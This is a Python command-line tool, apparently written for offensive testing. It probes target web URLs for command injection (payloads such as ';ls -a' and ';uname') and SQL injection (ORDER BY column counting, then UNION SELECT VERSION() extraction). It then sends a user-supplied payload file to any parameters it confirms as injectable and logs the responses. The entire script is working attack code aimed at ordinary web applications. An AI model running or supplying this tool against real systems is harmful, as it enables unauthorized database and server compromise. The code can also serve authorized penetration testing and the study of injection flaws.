import click
import requests
from utils import get_time, info_print, success_print, fail_print
from bcolors import bcolors
from file_handler import append_on_file
import json
from consts import HEURISTIC_NO_COL
import random
import string

EXPLOIT_LIST=[
    '\' ORDER BY',
    '" ORDER BY',
    '1 ORDER BY',
]

URLS=[]

@click.command()
@click.option('--target', '--t', required=True, help='A target host (e.g., http://localhost)')
@click.option('--urls', '--u', required=True, multiple=True, help='A list of URLs to scan')
@click.option('--methods', '--m', required=True, type=click.Choice(['GET', 'POST'], case_sensitive=True), multiple=True, help='A list of methods for each URL')
@click.option('--params', '--p', required=True, multiple=True, help='A list of parameters for each URL You can use any input format you want')
@click.option('--injection', '--i', required=True, type=click.Choice(['cmd', 'sql']), multiple=True, help='Kind of injection you want to perform')
@click.option('--filename', '--f', required=True, multiple=True, help='File containing payload to inject. (Must be inside the script folder)')
def main(target, urls, methods, params, injection, filename):

    format_requests(target, urls)

    for idx, method in enumerate(methods):
        info_print(f'Checking if {URLS[idx]} is injectable...')
        inj = is_injectable(idx, params, urls, method, injection)

        if not inj[0]:
            fail_print(f'{URLS[idx]} seems not injectable.')
            continue

        append_on_file(f'{urls[idx]}-{injection[idx]}-output.txt', f'Starting time: {get_time()}\n\n')
        
        if not inj[1]:
            success_print("I did not find any information about back-end DBMS. But it seems injectable")
        else:
            success_print(f'I found an injection on the \'{params[0]}\' parameter of the \'{URLS[idx]}\', using the \'{inj[1]}\' payload!')
        
        success_print(f'Serving proivded payloads and writing results in \'{urls[idx]}-{injection[idx]}-output.txt\' file...')

        for payload in read_file(filename[idx]):
            p = prepare_single_payload(params, idx, payload)
            req = make_requests(method, idx, p)
            append_on_file(f'{urls[idx]}-{injection[idx]}-output.txt', f'PAYLOAD: {payload}\n{req.text}\n')

        success_print('DONE')
        append_on_file(f'{urls[idx]}-{injection[idx]}-output.txt', f'Ending time: {get_time()}\n\n')
        
def format_requests(target, urls):
    for url in urls:
        URLS.append(f"{target}/{url}")

def is_injectable(idx, params, urls, method, injection):
    if injection[idx] == 'cmd':
        return is_cmd_injectable(idx, params, urls, method)
    
    if injection[idx] == 'sql':
        return is_sql_injectable(idx, params, urls, method)

def is_cmd_injectable(idx, params, urls, method):
    CMD_EXPLOIT_LIST = [
        'echo injected > cmd_inj.txt | find . -name cmd_inj.txt', 
        ';ls -a',
        f'{urls[idx]}',
        ';ls',
        'uname',
        ';uname',
    ]

    for cmd_exploit in CMD_EXPLOIT_LIST:
        payload = prepare_single_payload(params, idx, cmd_exploit)
        req = make_requests(method, idx, payload)
        if '.' in req.text and '..' in req.text or f'./{ cmd_exploit }' in req.text or 'Linux' in req.text:
            return (True, cmd_exploit)

    return (False, "")

def is_sql_injectable(idx, params, urls, method):

    info_print('Trying \'ORDER\' BY technique to find the right number of query columns.')

    no_col = get_columns_number(params, idx, method)

    if no_col == 0:
        fail_print('\'ORDER\' BY technique it seems not to work.')
        return (False, "")

    success_print(f'I Found the number of query columns: {no_col}')

    #print(f'{exploit_idx} Indice di exploit')

    # type check

    first_str = random_string(4)
    snd_str = random_string(4)

    info_print('Trying to retrieve database version information...')

    info_list = [
        f'\' UNION SELECT CONCAT(\'{first_str}\',VERSION(), \'{snd_str}\')',
        f'" UNION SELECT CONCAT(\'{first_str}\',VERSION(), \'{snd_str}\')',
        f'1 UNION SELECT CONCAT(\'{first_str}\',VERSION(), \'{snd_str}\')',
        f'1 UNION SELECT VERSION()',
    ]

    union_str = ""
    param_list = params[idx].split(':')
    version = ""

    for info in info_list:
        union_str += info
        for x in range (1, no_col):
            union_str += ',NULL'
        union_str += '-- '
        for param in param_list:
            p = {param: union_str}
            req = make_requests(method, idx, p)
            print(req.text)
            if first_str in req.text:
                start_idx = req.text.index(first_str) + len(first_str)
                end_idx = req.text.index(snd_str)
                version = req.text[start_idx:end_idx]
                if len(version) > 0:
                    #print(version)
                    success_print(f'I Found information about back-end DBMS: \'{version}\'\n')
                    return (True, union_str)

        union_str = ""
    
    if len(version) == 0:
        return (True, "")

    return (True, union_str)

def get_columns_number(params, idx, method):
    exploit_idx = -1
    no_col = -1

    for index, exploit in enumerate(EXPLOIT_LIST):
        payload = prepare_single_payload(params, idx, exploit)
        for x in range(1, HEURISTIC_NO_COL):
            p = { k:v + f' {x}-- ' for k,v in payload.items() }
            req = make_requests(method, idx, p)
            #print(req.url)
            #print(req.text)
            if not req.text and req.status_code != 200:
                if x > no_col:
                    exploit_idx = index
                    no_col = x - 1
                    break
    return no_col

def prepare_single_payload(params, idx, payload):
    payload_dict = {}
    params = params[idx].split(':')
    for param in params:
        payload_dict[param]=payload
    return payload_dict

def make_requests(method, idx, payload):
    match method:
        case 'GET':
            return requests.get(URLS[idx], params=payload)
        case 'POST':
            return requests.post(URLS[idx], data=payload)
        case _:
            return "Method not implemented"

def random_string(length):
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for i in range(length))

def read_file(filename):
    with open(filename, 'rb') as infile:
        for line in infile:
            yield line

if __name__ == '__main__':
    main()
